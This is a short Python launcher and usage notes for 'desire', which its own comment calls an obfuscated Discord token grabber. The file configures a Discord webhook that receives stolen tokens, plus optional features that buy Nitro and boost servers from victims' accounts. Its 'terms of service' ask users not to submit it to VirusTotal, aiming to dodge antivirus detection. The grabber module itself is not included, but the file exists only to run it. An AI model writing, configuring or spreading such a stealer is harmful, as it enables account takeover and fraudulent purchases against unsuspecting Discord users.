import desire # Import desire token grabber (obfuscated)

"""
terms of service:
    - do not attempt to "crack" the "desire" module
    - do not share desire
    - do not post on virustotal or public virus websites (on purpose)

documentation:

    Webhook: str
        Required*
        Full discord webhook url, example: https://discord.com/api/webhooks/xxxxx/xxxxx
    
    ping: str or None
        required*
        Either set it to None for no ping or set it to either <@user_id> or @everyone / @here
    
    nitro: dict or None
        not required*
        Either set to None to disable the nitro purchaser or set it to this:
            {
                "identifier": "xxxx", 
                "duration": "xxxx"
            }
            
        Identifiers:
            classic, boost
            
        Durations:
            month, year
 
    boost: dict or None
        not required*
        Either set to None to disable the auto booster or set it to this:
            {
                "guild_id": "xxxx", 
                "invite": "xxxx"
            }
"""

client = desire.Main( # Create the desire class
    webhook="https://discord.com/api/webhooks/xxxx/xxxx",
    ping=None,
    nitro=None,
    boost=None
)

if __name__ == "__main__":
    client.start() # Initalize desire
